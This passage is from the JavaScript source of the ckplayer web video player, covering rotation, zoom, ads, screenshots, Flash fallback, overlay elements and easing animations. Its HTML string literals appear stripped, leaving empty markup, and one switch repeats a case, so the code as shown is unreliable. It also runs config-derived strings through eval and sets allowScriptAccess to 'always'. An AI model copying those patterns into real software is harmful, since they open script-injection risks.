90 && y270 == 90) { ys = true; } if (y90 == 0 && y180 == 90 && y270 == 0) { ys = true; } if (y90 == -0 && y180 == -90 && y270 == -90) { ys = true; } if (y90 == -0 && y180 == -90 && y270 == -0) { ys = true; } tf = tf.replace(/rotate\\([^)]+\\)/, '').replace(/scale\\([^)]+\\)/, '') + ' rotate(' + n + 'deg)'; var cdW = this.CD.offsetWidth, cdH = this.CD.offsetHeight, vW = this.V.videoWidth, vH = this.V.videoHeight; if (vW > 0 && vH > 0) { if (ys) { if (cdW / cdH > vH / vW) { nH = cdH; nW = vH * nH / vW; } else { nW = cdW; nH = vW * nW / vH; } this.css(this.V, 'transform', 'rotate(0deg)'); this.css(this.V, 'transform', 'scale(' + nH / cdW + ',' + nW / cdH + ')' + tf); } else { this.css(this.V, 'transform', tf); } } else { this.css(this.V, 'transform', tf); } return; }, videoBrightness: function(n) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoBrightness(n); return; } }, videoContrast: function(n) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoContrast(n); return; } }, videoSaturation: function(n) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoSaturation(n); return; } }, videoHue: function(n) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoHue(n); return; } }, videoZoom: function(n) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoZoom(n); return; } if (this.isUndefined(n)) { n = 1; } if (n < 0) { n = 0; } if (n > 2) { n = 2; } var tf = this.css(this.V, 'transform'); tf = tf.replace(/scale\\([^)]+\\)/, '') + ' scale(' + n + ')'; this.videoScale = n; this.css(this.V, 'transform', tf); return; }, videoProportion: function(w, h) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoProportion(w, h); return; } }, adPlay: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.adPlay(); return; } if (this.adPlayerPlay) { this.adIsPause = false; var ad = this.getNowAdvertisements(); var type = ad['type']; if (this.isStrImage(type)) { this.adCountDown(); } else { this.V.play(); } } }, adPause: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.adPause(); return; } if (this.adPlayerPlay) { this.adIsPause = true; var ad = this.getNowAdvertisements(); var type = ad['type']; if (type != 'jpg' && type != 'jpeg' && type != 'png' && type != 'svg' && type != 'gif') { this.videoPause(); } } }, videoError: function(n) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoError(n); return; } }, changeConfig: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { var args = Array.prototype.slice.call(arguments); switch(args.length){ case 1: this.V.changeConfig(args[0]); break; case 2: this.V.changeConfig(args[0],args[1]); break; case 3: this.V.changeConfig(args[0],args[1],args[2]); break; case 4: this.V.changeConfig(args[0],args[1],args[2],args[3]); break; case 5: this.V.changeConfig(args[0],args[1],args[2],args[3],args[4]); break; case 6: this.V.changeConfig(args[0],args[1],args[2],args[3],args[4],args[5]); break; case 7: this.V.changeConfig(args[0],args[1],args[2],args[3],args[4],args[5],args[6]); break; case 8: this.V.changeConfig(args[0],args[1],args[2],args[3],args[4],args[5],args[6],args[7]); break; case 8: this.V.changeConfig(args[0],args[1],args[2],args[3],args[4],args[5],args[6],args[7],args[8]); break; } return; } var obj = this.ckplayerConfig; var arg = arguments; for (var i = 0; i < arg.length - 1; i++) { if (obj.hasOwnProperty(arg[i])) { obj = obj[arg[i]]; } else { return; } } var val = arg[arg.length - 1]; switch (arg.length) { case 2: this.ckplayerConfig[arg[0]] = val; break; case 3: this.ckplayerConfig[arg[0]][arg[1]] = val; break; case 4: this.ckplayerConfig[arg[0]][arg[1]][arg[2]] = val; break; case 5: this.ckplayerConfig[arg[0]][arg[1]][arg[2]][arg[3]] = val; break; case 6: this.ckplayerConfig[arg[0]][arg[1]][arg[2]][arg[3]][arg[4]] = val; break; case 7: this.ckplayerConfig[arg[0]][arg[1]][arg[2]][arg[3]][arg[4]][arg[5]] = val; break; case 8: this.ckplayerConfig[arg[0]][arg[1]][arg[2]][arg[3]][arg[4]][arg[5]][arg[6]] = val; break; case 9: this.ckplayerConfig[arg[0]][arg[1]][arg[2]][arg[3]][arg[4]][arg[5]][arg[6]][arg[7]] = val; break; case 10: this.ckplayerConfig[arg[0]][arg[1]][arg[2]][arg[3]][arg[4]][arg[5]][arg[6]][arg[7]][arg[8]] = val; break; default: return; break; } this.sendJS('configChange', this.ckplayerConfig); }, custom: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.custom(arguments); return; } }, getConfig: function() { if (!this.loaded) { return null; } if (this.playerType == 'flashplayer') { return this.V.getConfig(arguments); } else{ var temp=this.ckplayerConfig; for(var index in arguments) { try{ temp=temp[arguments[index]]; } catch(error){ temp=null; } }; return temp; } }, openUrl: function(n) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.openUrl(n); return; } }, /* 接口函数 清除视频 */ videoClear: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoClear(); return; } }, /* 接口函数 向播放器传递新的视频地址 */ newVideo: function(c) { if (this.playerType == 'flashplayer') { this.V.newVideo(c); return; } else { this.embed(c); } }, /* 接口函数 截图 */ screenshot: function(obj, save, name) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { try { this.V.screenshot(obj, save, name); } catch(error) { this.log(error); } return; } if (obj == 'video') { var newCanvas = document.createElement('canvas'); newCanvas.width = this.V.videoWidth; newCanvas.height = this.V.videoHeight; newCanvas.getContext('2d').drawImage(this.V, 0, 0, this.V.videoWidth, this.V.videoHeight); try { var base64 = newCanvas.toDataURL('image/jpeg'); this.sendJS('screenshot', { object: obj, save: save, name: name, base64: base64 }); } catch(error) { this.log(error); } } }, /* 接口函数 改变播放器尺寸 */ changeSize: function(w, h) { if (this.isUndefined(w)) { w = 0; } if (this.isUndefined(h)) { h = 0; } if (w > 0) { this.css(this.CD, 'width', w + 'px'); } if (h > 0) { this.css(this.CD, 'height', h + 'px'); } if (this.html5Video) { this.elementCoordinate(); } }, /* 接口函数 改变视频播放速度 */ changePlaybackRate: function(n) { if (this.html5Video) { var arr = this.playbackRateArr; n = parseInt(n); if (n < arr.length) { this.newPlaybackrate(arr[n][1]); } } }, /* 内部函数 注册控制控制栏显示与隐藏函数 */ changeControlBarShow: function(show) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.changeControlBarShow(show); return; } if (show) { this.controlBarIsShow = true; this.controlBarHide(false); } else { this.controlBarIsShow = false; this.controlBarHide(true); } }, /* ----------------------------------------------------------------------- 调用flashplayer */ embedSWF: function() { var vid = this.randomString(); var flashvars = this.getFlashVars(); var param = this.getFlashplayerParam(); var flashplayerUrl = 'http://www.macromedia.com/go/getflashplayer'; var html = '', src = javascriptPath + 'ckplayer.swf'; id = 'id=\"' + vid + '\" name=\"' + vid + '\" '; html += ''; html += ''; this.PD.innerHTML = html; this.V = this.getObjectById(vid); //V：定义播放器对象全局变量 this.playerType = 'flashplayer'; //if(!this.checkShockwaveFlash()){ //this.PD.innerHTML = ''+this.language['noLoadShockwaveFlash']+''+this.language['downLoadShockwaveFlash']+''; //this.css(this.PD,{color:'#FFFFFF',textAlign:'center',paddingTop:'40px'}); //} }, /* 判断浏览器是否支持flashplayer */ checkShockwaveFlash:function(){ if(window.ActiveXObject) { try { var s = new ActiveXObject('ShockwaveFlash.ShockwaveFlash'); if(s) { return true; } } catch(e) {} } else { try { var s = navigator.plugins['Shockwave Flash']; if(s) { return true; } } catch(e) {} } return false; }, /* 内置函数 将vars对象转换成字符 */ getFlashVars: function() { this.getVarsObject(); var v = this.vars; var z = ''; for (k in v) { if (k != 'flashplayer' && k != 'container' && v[k] != '') { if (z != '') { z += '&'; } var vk = v[k]; if (vk == true) { vk = 1; } if (vk == false) { vk = 0; } z += k + '=' + vk; } } if (!v.hasOwnProperty('volume') || !v['volume']) { if (z != '') { z += '&'; } z += 'volume=0'; } return z; }, /*判断字符串是否是图片*/ isStrImage: function(s) { if (s == 'jpg' || s == 'jpeg' || s == 'png' || s == 'svg' || s == 'gif') { return true; } return false; }, /* 内置函数 将vars格式化成flash能接受的对象。再由getFlashVars函数转化成字符串或由newVideo直接使用 */ getVarsObject: function() { var v = this.vars; var f = '', d = '', w = ''; //f=视频地址，d=清晰度地址,w=权重，z=最终地址 var arr = this.VA; var prompt = v['promptSpot']; var i = 0; var video = this.vars['video']; if (typeof(video) == 'object') { //对象或数组 if (!this.isUndefined(typeof(video.length))) { //说明是数组 var arr = video; for (i = 0; i < arr.length; i++) { var arr2 = arr[i]; if (arr2) { if (f != '') { f += this.ckplayerConfig['config']['split']; d += ','; w += ','; v['type'] += this.ckplayerConfig['config']['split']; } f += encodeURIComponent(decodeURIComponent(arr2[0])); d += arr2[2]; w += arr2[3]; v['type'] += arr2[1].replace('video/', ''); } } } else { f = encodeURIComponent(decodeURIComponent(video['file'])); if (!this.isUndefined(video['type'])) { v['type'] = video['type']; } d = ''; w = ''; } } else { f = encodeURIComponent(decodeURIComponent(video)); } if (v['preview'] != null) { v['previewscale'] = v['preview']['scale']; v['preview'] = v['preview']['file'].join(','); } if (prompt != null) { v['promptspot'] = ''; v['promptspottime'] = ''; for (i = 0; i < prompt.length; i++) { if (v['promptspot'] != '') { v['promptspot'] += ','; v['promptspottime'] += ','; } v['promptspot'] += prompt[i]['words']; v['promptspottime'] += prompt[i]['time']; } } if (f != '') { v['video'] = f; v['definition'] = d; v['weight'] = w; } if (!v['volume']) { v['volume'] = 0; } var newV = {}; for (var k in v) { if (v[k] != null) { newV[k] = v[k]; } if (k == 'type') { newV[k] = v[k].replace('video/m3u8', 'm3u8'); } } this.vars = newV; }, /* 内置函数 将embedSWF里的param的对象进行转换 */ getFlashplayerParam: function() { var w = '', v = '', o = { allowScriptAccess: 'always', allowFullScreen: true, quality: 'high', bgcolor: '#000' }; for (var e in o) { w += e + '=\"' + o[e] + '\" '; v += ''; } w = w.replace('movie=', 'src='); return { w: w, v: v }; }, /* 操作动作结束 ----------------------------------------------------------------------- 接口函数 获取元数据部分 */ getMetaDate: function() { if (!this.loaded || this.V == null) { return false; } if (this.playerType == 'html5video') { var duration = 0; try { duration = !isNaN(this.V.duration) ? this.V.duration: 0; if (isNaN(duration) || parseInt(duration) < 0.2) { if(this.vars['duration']>0){ duration=this.vars['duration']; } } if(this.vars['forceduration']>0){ duration=this.vars['forceduration']; } } catch(event) { this.log(event); } var data = { duration: duration, volume: this.V.volume, playbackRate: this.V.playbackRate, width: this.PD.offsetWidth || this.V.offsetWidth || this.V.width, height: this.PD.offsetHeight || this.V.offsetHeight || this.V.height, streamWidth: this.V.videoWidth, streamHeight: this.V.videoHeight, videoWidth: this.V.offsetWidth, videoHeight: this.V.offsetHeight, paused: this.V.paused, loadTime:this.loadTimeTemp }; return data; } else { try { return this.V.getMetaDate(); } catch(event) { this.log(event); } } return false; }, /* 接口函数 取当前提供给播放器播放的视频列表 */ getVideoUrl: function() { if (this.playerType == 'flashplayer') { return this.V.getVideoUrl(); } var arr = []; if (this.V.src) { arr.push(this.V.src); } else { var uArr = this.V.childNodes; for (var i = 0; i < uArr.length; i++) { arr.push(uArr[i].src); } } return arr; }, /* 内置函数 格式化函数 */ clickEvent: function(call) { if (call == 'none' || call == '' || call == null) { return { type: 'none' }; } var callArr = call.split('->'); var type = '', fun = '', link = '', target = ''; if (callArr.length == 2) { var callM = callArr[0]; var callE = callArr[1]; if (!callE) { return { type: 'none' }; } var val = ''; var eArr = []; type = callM; switch (callM) { case 'actionScript': //trace(THIS.hasOwnProperty(callE)); if (callE.indexOf('(') > -1) { eArr = callE.split('('); callE = eArr[0]; val = eArr[1].replace(')', ''); } if (val == '') { fun = 'thisTemp.' + callE + '()'; } else { fun = 'thisTemp.' + callE + '(' + val + ')'; } break; case 'javaScript': if (callE.substr(0, 11) == '[flashvars]') { callE = callE.substr(11); if (this.vars.hasOwnProperty(callE)) { callE = this.vars[callE]; } else { break; } } if (callE.indexOf('(') > -1) { eArr = callE.split('('); callE = eArr[0]; val = eArr[1].replace(')', ''); } if (val == '') { fun = callE + '()'; } else { fun = callE + '(' + val + ')'; } break; case \"link\": var callLink = (callE + ',').split(','); if (callLink[0].substr(0, 11) == '[flashvars]') { var fl = callLink[0].replace('[flashvars]', ''); if (this.vars.hasOwnProperty(fl)) { callLink[0] = this.vars[fl]; } else { break; } } if (!callLink[1]) { callLink[1] = '_blank'; } link = callLink[0]; target = callLink[1]; break; } } return { type: type, fun: fun, link: link, target: target } }, /* 内置函数 根据指定的align,valign,offsetX,offsetY计算坐标 */ getPosition: function(obj) { /* { \"align\": \"right\", \"vAlign\": \"right\", \"offsetX\": -60, \"offsetY\": -60 } */ var pw = this.PD.offsetWidth, ph = this.PD.offsetHeight; var x = 0, y = 0; switch (obj['align']) { case 'left': x = obj['offsetX']; break; case 'center': x = pw * 0.5 + obj['offsetX']; break; case 'right': x = pw + obj['offsetX']; break; } switch (obj['vAlign']) { case 'top': y = obj['offsetY']; break; case 'middle': y = ph * 0.5 + obj['offsetY']; break; case 'bottom': y = ph + obj['offsetY']; break; } return { x: x, y: y }; }, /* 内置函数 向播放器界面添加一个文本 */ addElement: function(attribute) { var thisTemp = this; if (this.playerType == 'flashplayer') { return this.V.addElement(attribute); } var i = 0; var obj = { list: null, x: '100%', y: \"50%\", position: null, alpha: 1, backgroundColor: '', backAlpha: 1, backRadius: 0, clickEvent: '' }; obj = this.standardization(obj, attribute); var list = obj['list']; if (list == null) { return ''; } var id = 'element' + this.randomString(10); var ele = document.createElement('div'); ele.className = id; if (obj['x']) { ele.setAttribute('data-x', obj['x']); } if (obj['y']) { ele.setAttribute('data-y', obj['y']); } if (obj['position'] != null) { ele.setAttribute('data-position', obj['position'].join(',')); } this.PD.appendChild(ele); var eid = this.getByElement(id); this.css(eid, { position: 'absolute', filter: 'alpha(opacity:' + obj['alpha'] + ')', opacity: obj['alpha'].toString(), width: '800px', zIndex: '20' }); var bgid = 'elementbg' + this.randomString(10); var bgAlpha = obj['alpha'].toString(); var bgColor = obj['backgroundColor'].replace('0x', '#'); var html = ''; var idArr = []; var clickArr = []; if (!this.isUndefined(list) && list.length > 0) { var textObj, returnObj, clickEvent; for (i = 0; i < list.length; i++) { var newEleid = 'elementnew' + this.randomString(10); switch (list[i]['type']) { case 'image': case 'png': case 'jpg': case 'jpeg': case 'gif': textObj = { type: 'image', file: '', radius: 0, //圆角弧度 width: 30, //定义宽，必需要定义 height: 30, //定义高，必需要定义 alpha: 1, //透明度 paddingLeft: 0, //左边距离 paddingRight: 0, //右边距离 paddingTop: 0, paddingBottom: 0, marginLeft: 0, marginRight: 0, marginTop: 0, marginBottom: 0, backgroundColor: '', clickEvent: '' }; list[i] = this.standardization(textObj, list[i]); clickEvent = this.clickEvent(list[i]['clickEvent']); clickArr.push(clickEvent); if (clickEvent['type'] == 'link') { html += ''; } else { html += ''; } break; case 'text': textObj = { type: 'text', //说明是文本 text: '', //文本内容 color: '0xFFFFFF', size: 14, font: this.fontFamily, leading: 0, alpha: 1, //透明度 paddingLeft: 0, //左边距离 paddingRight: 0, //右边距离 paddingTop: 0, paddingBottom: 0, marginLeft: 0, marginRight: 0, marginTop: 0, marginBottom: 0, backgroundColor: '', backAlpha: 1, backRadius: 0, //背景圆角弧度，支持数字统一设置，也支持分开设置[30,20,20,50]，对应上左，上右，下右，下左 clickEvent: '' }; list[i] = this.standardization(textObj, list[i]); clickEvent = this.clickEvent(list[i]['clickEvent']); clickArr.push(clickEvent); if (clickEvent['type'] == 'link') { html += '' + list[i]['text'] + ''; } else { html += '' + list[i]['text'] + ''; } break; default: break; } idArr.push(newEleid); } } var objClickEvent = this.clickEvent(obj['clickEvent']); /*if(objClickEvent['type']=='link'){ html = '' + html + ''; }*/ eid.innerHTML = '' + html + ''; if (objClickEvent['type'] == 'javaScript' || objClickEvent['type'] == 'actionScript') { var objClickHandler = function() { eval(objClickEvent['fun']); thisTemp.sendJS('clickEvent', clk['type'] + '->' + clk['fun'].replace('thisTemp.', '').replace('()', '')); }; this.addListenerInside('click', objClickHandler, this.getByElement(bgid + '_c')) } this.css(bgid + '_c', { position: 'absolute', zIndex: '2' }); for (i = 0; i < idArr.length; i++) { var clk = clickArr[i]; if (clk['type'] == 'javaScript' || clk['type'] == 'actionScript') { var clickHandler = function() { clk = clickArr[this.getAttribute('data-i')]; eval(clk['fun']); thisTemp.sendJS('clickEvent', clk['type'] + '->' + clk['fun'].replace('thisTemp.', '').replace('()', '')); }; this.addListenerInside('click', clickHandler, this.getByElement(idArr[i])) } switch (list[i]['type']) { case 'image': case 'png': case 'jpg': case 'jpeg': case 'gif': this.css(idArr[i], { float: 'left', width: list[i]['width'] + 'px', height: list[i]['height'] + 'px', filter: 'alpha(opacity:' + list[i]['alpha'] + ')', opacity: list[i]['alpha'].toString(), marginLeft: list[i]['marginLeft'] + 'px', marginRight: list[i]['marginRight'] + 'px', marginTop: list[i]['marginTop'] + 'px', marginBottom: list[i]['marginBottom'] + 'px', borderRadius: list[i]['radius'] + 'px', cursor: 'pointer' }); this.css(idArr[i] + '_image', { width: list[i]['width'] + 'px', height: list[i]['height'] + 'px', borderRadius: list[i]['radius'] + 'px' }); break; case 'text': this.css(idArr[i] + '_text', { filter: 'alpha(opacity:' + list[i]['alpha'] + ')', opacity: list[i]['alpha'].toString(), borderRadius: list[i]['radius'] + 'px', fontFamily: list[i]['font'], fontSize: list[i]['size'] + 'px', color: list[i]['color'].replace('0x', '#'), lineHeight: list[i]['leading'] > 0 ? list[i]['leading'] + 'px': '', paddingLeft: list[i]['paddingLeft'] + 'px', paddingRight: list[i]['paddingRight'] + 'px', paddingTop: list[i]['paddingTop'] + 'px', paddingBottom: list[i]['paddingBottom'] + 'px', whiteSpace: 'nowrap', position: 'absolute', zIndex: '3', cursor: 'pointer' }); this.css(idArr[i], { float: 'left', width: this.getByElement(idArr[i] + '_text').offsetWidth + 'px', height: this.getByElement(idArr[i] + '_text').offsetHeight + 'px', marginLeft: list[i]['marginLeft'] + 'px', marginRight: list[i]['marginRight'] + 'px', marginTop: list[i]['marginTop'] + 'px', marginBottom: list[i]['marginBottom'] + 'px' }); this.css(idArr[i] + '_bg', { width: this.getByElement(idArr[i] + '_text').offsetWidth + 'px', height: this.getByElement(idArr[i] + '_text').offsetHeight + 'px', filter: 'alpha(opacity:' + list[i]['backAlpha'] + ')', opacity: list[i]['backAlpha'].toString(), borderRadius: list[i]['backRadius'] + 'px', backgroundColor: list[i]['backgroundColor'].replace('0x', '#'), position: 'absolute', zIndex: '2' }); break; default: break; } } this.css(bgid, { width: this.getByElement(bgid + '_c').offsetWidth + 'px', height: this.getByElement(bgid + '_c').offsetHeight + 'px', position: 'absolute', filter: 'alpha(opacity:' + bgAlpha + ')', opacity: bgAlpha, backgroundColor: bgColor.replace('0x', '#'), borderRadius: obj['backRadius'] + 'px', zIndex: '1' }); this.css(eid, { width: this.getByElement(bgid).offsetWidth + 'px', height: this.getByElement(bgid).offsetHeight + 'px' }); var eidCoor = this.calculationCoor(eid); this.css(eid, { left: eidCoor['x'] + 'px', top: eidCoor['y'] + 'px' }); this.elementArr.push(eid.className); return eid; }, /* 内置函数 获取元件的属性，包括x,y,width,height,alpha */ getElement: function(element) { if (this.playerType == 'flashplayer') { return this.V.getElement(element); } var ele = element; if (typeof(element) == 'string') { ele = this.getByElement(element); } var coor = this.getCoor(ele); return { x: coor['x'], y: coor['y'], width: ele.offsetWidth, height: ele.offsetHeight, alpha: !this.isUndefined(this.css(ele, 'opacity')) ? parseFloat(this.css(ele, 'opacity')) : 1, show: this.css(ele, 'display') == 'none' ? false: true }; }, /* 内置函数 控制元件显示和隐藏 */ elementShow: function(element, show) { if (this.playerType == 'flashplayer') { this.V.elementShow(element, show); return; } if (typeof(element) == 'string') { if (element) { this.css(ele, 'display', show == true ? 'block': 'none'); } else { var arr = this.elementTempArr; for (var i = 0; i < arr.length; i++) { this.css(arr[i], 'display', show == true ? 'block': 'none'); } } } }, /* 内置函数 根据节点的x,y计算在播放器里的坐标 */ calculationCoor: function(ele) { if (this.playerType == 'flashplayer') { return this.V.calculationCoor(ele); } if (ele == []) { return; } var x, y, position = []; var w = this.PD.offsetWidth, h = this.PD.offsetHeight; var ew = ele.offsetWidth, eh = ele.offsetHeight; if (!this.isUndefined(this.getDataset(ele, 'x'))) { x = this.getDataset(ele, 'x'); } if (!this.isUndefined(this.getDataset(ele, 'y'))) { y = this.getDataset(ele, 'y'); } if (!this.isUndefined(this.getDataset(ele, 'position'))) { try { position = this.getDataset(ele, 'position').toString().split(','); } catch(event) {} } if (position.length > 0) { position.push(null, null, null, null); var i = 0; for (i = 0; i < position.length; i++) { if (this.isUndefined(position[i]) || position[i] == null || position[i] == 'null' || position[i] == '') { position[i] = null; } else { position[i] = parseFloat(position[i]); } } if (position[2] == null) { switch (position[0]) { case 0: x = 0; break; case 1: x = parseInt((w - ew) * 0.5); break; default: x = w - ew; break; } } else { switch (position[0]) { case 0: x = position[2]; break; case 1: x = parseInt(w * 0.5) + position[2]; break; default: x = w + position[2]; break; } } if (position[3] == null) { switch (position[1]) { case 0: y = 0; break; case 1: y = parseInt((h - eh) * 0.5); break; default: y = h - eh; break; } } else { switch (position[1]) { case 0: y = position[3]; break; case 1: y = parseInt(h * 0.5) + position[3]; break; default: y = h + position[3]; break; } } } else { if (x.substring(x.length - 1, x.length) == '%') { x = Math.floor(parseInt(x.substring(0, x.length - 1)) * w * 0.01); } if (y.substring(y.length - 1, y.length) == '%') { y = Math.floor(parseInt(y.substring(0, y.length - 1)) * h * 0.01); } } return { x: x, y: y } }, /* 内置函数 修改新增元件的坐标 */ changeElementCoor: function() { for (var i = 0; i < this.elementArr.length; i++) { if (this.getByElement(this.elementArr[i]) != []) { var c = this.calculationCoor(this.getByElement(this.elementArr[i])); if (c['x'] && c['y']) { this.css(this.elementArr[i], { top: c['y'] + 'px', left: c['x'] + 'px' }); } } } }, /* 内置函数 缓动效果集 */ tween: function() { var Tween = { None: { //均速运动 easeIn: function(t, b, c, d) { return c * t / d + b; }, easeOut: function(t, b, c, d) { return c * t / d + b; }, easeInOut: function(t, b, c, d) { return c * t / d + b; } }, Quadratic: { easeIn: function(t, b, c, d) { return c * (t /= d) * t + b; }, easeOut: function(t, b, c, d) { return - c * (t /= d) * (t - 2) + b; }, easeInOut: function(t, b, c, d) { if ((t /= d / 2) < 1) return c / 2 * t * t + b; return - c / 2 * ((--t) * (t - 2) - 1) + b; } }, Cubic: { easeIn: function(t, b, c, d) { return c * (t /= d) * t * t + b; }, easeOut: function(t, b, c, d) { return c * ((t = t / d - 1) * t * t + 1) + b; }, easeInOut: function(t, b, c, d) { if ((t /= d / 2) < 1) return c / 2 * t * t * t + b; return c / 2 * ((t -= 2) * t * t + 2) + b; } }, Quartic: { easeIn: function(t, b, c, d) { return c * (t /= d) * t * t * t + b; }, easeOut: function(t, b, c, d) { return - c * ((t = t / d - 1) * t * t * t - 1) + b; }, easeInOut: function(t, b, c, d) { if ((t /= d / 2) < 1) return c / 2 * t * t * t * t + b; return - c / 2 * ((t -= 2) * t * t * t - 2) + b; } }, Quintic: { easeIn: function(t, b, c, d) { return c * (t /= d) * t * t * t * t + b; }, easeOut: function(t, b, c, d) { return c * ((t = t / d - 1) * t * t * t * t + 1) + b; }, easeInOut: function(t, b, c, d) { if ((t /= d / 2) < 1) return c / 2 * t * t * t * t * t + b; return c / 2 * ((t -= 2) * t * t * t * t + 2) + b; } }, Sine: { easeIn: function(t, b, c, d) { return - c * Math.cos(t / d * (Math.PI / 2)) + c + b; }, easeOut: function(t, b, c, d) { return c * Math.sin(t / d * (Math.PI / 2)) + b; }, easeInOut: function(t, b, c, d) { return - c / 2 * (Math.cos(Math.PI * t / d) - 1) + b; } }, Exponential: { easeIn: function(t, b, c, d) { return (t == 0) ? b: c * Math.pow(2, 10 * (t / d - 1)) + b; }, easeOut: function(t, b, c, d) { return (t == d) ? b + c: c * ( - Math.pow(2, -10 * t / d) + 1) + b; }, easeInOut: function(t, b, c, d) { if (t == 0) return b; if (t == d) return b + c; if ((t /= d / 2) < 1) return c / 2 * Math.pow(2, 10 * (t - 1)) + b; return c / 2 * ( - Math.pow(2, -10 * --t) + 2) + b; } }, Circular: { easeIn: function(t, b, c, d) { return - c * (Math.sqrt(1 - (t /= d) * t) - 1) + b; }, easeOut: function(t, b, c, d) { return c * Math.sqrt(1 - (t = t / d - 1) * t) + b; }, easeInOut: function(t, b, c, d) { if ((t /= d / 2) < 1) return - c / 2 * (Math.sqrt(1 - t * t) - 1) + b; return c / 2 * (Math.sqrt(1 - (t -= 2) * t) + 1) + b; } }, Elastic: { easeIn: function(t, b, c, d, a, p) { if (t == 0) return b; if ((t /= d) == 1) return b + c; if (!p) p = d * .3; if (!a || a < Math.abs(c)) { a = c; var s = p / 4; } else var s = p / (2 * Math.PI) * Math.asin(c / a); return - (a * Math.pow(2, 10 * (t -= 1)) * Math.sin((t * d - s) * (2 * Math.PI) / p)) + b; }, easeOut: function(t, b, c, d, a, p) { if (t == 0) return b; if ((t /= d) == 1) return b + c; if (!p) p = d * .3; if (!a || a < Math.abs(c)) { a = c; var s = p / 4; } else var s = p / (2 * Math.PI) * Math.asin(c / a); return (a * Math.pow(2, -10 * t) * Math.sin((t * d - s) * (2 * Math.PI) / p) + c + b); }, easeInOut: function(t, b, c, d, a, p) { if (t == 0) return b; if ((t /= d / 2) == 2) return b + c; if (!p) p = d * (.3 * 1.5); if (!a || a < Math.abs(c)) { a = c; var s = p / 4; } else var s = p / (2 * Math.PI) * Math.asin(c / a); if (t < 1) return - .5 * (a * Math.pow(2, 10 * (t -= 1)) * Math.sin((t * d - s) * (2 * Math.PI) / p)) + b; return a * Math.pow(2, -10 * (t -= 1)) * Math.sin((t * d - s) * (2 * Math.PI) / p) * .5 + c + b; } }, Back: { easeIn: function(t, b, c, d, s) { if (s == undefined) s = 1.70158; return c * (t /= d) * t * ((s + 1) * t - s) + b; }, easeOut: function(t, b, c, d, s) { if (s == undefined) s = 1.70158; return c * ((t = t / d - 1) * t * ((s + 1) * t + s) + 1) + b; }, easeInOut: function(t, b, c, d, s) { if (s == undefined) s = 1.70158; if ((t /= d / 2) < 1) return c / 2 * (t * t * (((s *= (1.525)) + 1) * t - s)) + b; return c / 2 * ((t -= 2) * t * (((s *= (1.525)) + 1) * t + s) + 2) + b; } }, Bounce: { easeIn: function(t, b, c, d) { return c - Tween.Bounce.easeOut(d - t, 0, c, d) + b; }, easeOut: function(t, b, c, d) { if ((t /= d) < (1 / 2.75)) { return c * (7.5625 * t * t) + b; } else if (t < (2 / 2.75)) { return c * (7.5625 * (t -= (1.5 / 2.75)) * t + .75) + b; } else if (t < (2.5 / 2.75)) { return c * (7.5625 * (t -= (2.25 / 2.75)) * t + .9375) + b; } else { return c * (7.5625 * (t -= (2.625 / 2.75)) * t + .984375) + b; } }, easeInOut: function(t, b, c, d) { if (t < d / 2) return Tween.Bounce.easeIn(t * 2, 0, c, d) * .5 + b; else return Tween.Bounce.easeOut(t * 2 - d, 0, c, d) * .5 + c * .5 + b; } } }; return Tween; }, /* 接口函数 缓动效果 ele:Object=需要缓动的对象, parameter:String=需要改变的属性：x,y,width,height,alpha, effect:String=效果名称, start:Int=起始值, end:Int=结束值, speed:Number=运动的总秒数，支持小数 */ animate: function(attribute) { if (this.playerType == 'flashplayer') { return this.V.animate(attribute); } var thisTemp = this; var animateId = 'animate_' + this.randomString(); var obj = { element: null, parameter: 'x', static: false, effect: 'None.easeIn', start: null, end: null, speed: 0, overStop: false, pauseStop: false, //暂停播放时缓动是否暂停 callBack: null }; obj = this.standardization(obj, attribute); if (obj['element'] == null || obj['speed'] == 0) { return false; } var w = this.PD.offsetWidth, h = this.PD.offsetHeight; var effArr = (obj['effect'] + '.').split('.'); var tweenFun = this.tween()[effArr[0]][effArr[1]]; var eleCoor = { x: 0, y: 0 }; if (this.isUndefined(tweenFun)) { return false; } //先将该元件从元件数组里删除，让其不再跟随播放器的尺寸改变而改变位置 var def = this.arrIndexOf(this.elementArr, obj['element'].className); if (def > -1) { this.elementTempArr.push(obj['element'].className); this.elementArr.splice(def, 1); } //var run = true; var css = {}; //对传递的参数进行转化，x和y转化成left,top var pm = this.getElement(obj['element']); //包含x,y,width,height,alpha属性 var t = 0; //当前时间 var b = 0; //初始值 var c = 0; //变化量 var d = obj['speed'] * 1000; //持续时间 var timerTween = null; var tweenObj = null; var start = obj['start'] == null ? '': obj['start'].toString(); var end = obj['end'] == null ? '': obj['end'].toString(); switch (obj['parameter']) { case 'x': if (obj['start'] == null) { b = pm['x']; } else { if (start.substring(start.length - 1, start.length) == '%') { b = parseInt(start) * w * 0.01; } else { b = parseInt(start); } } if (obj['end'] == null) { c = pm['x'] - b; } else { if (end.substring(end.length - 1, end.length) == '%') { c = parseInt(end) * w * 0.01 - b; } else if (end.substring(0, 1) == '-' || end.substring(0, 1) == '+') { if (typeof(obj['end']) == 'number') { c = parseInt(obj['end']) - b; } else { c = parseInt(end); } } else { c = parseInt(end) - b; } } break; case 'y': if (obj['start'] == null) { b = pm['y']; } else { if (start.substring(start.length - 1, start.length) == '%') { b = parseInt(start) * h * 0.01; } else { b = parseInt(start); } } if (obj['end'] == null) { c = pm['y'] - b; } else { if (end.substring(end.length - 1, end.length) == '%') { c = parseInt(end) * h * 0.01 - b; } else if (end.substring(0, 1) == '-' || end.substring(0, 1) == '+') { if (typeof(obj['end']) == 'number') { c = parseInt(obj['end']) - b; } else { c = parseInt(end); } } else { c = parseInt(end) - b; } } break; case 'alpha': if (obj['start'] == null) { b = pm['alpha'] * 100; } else { if 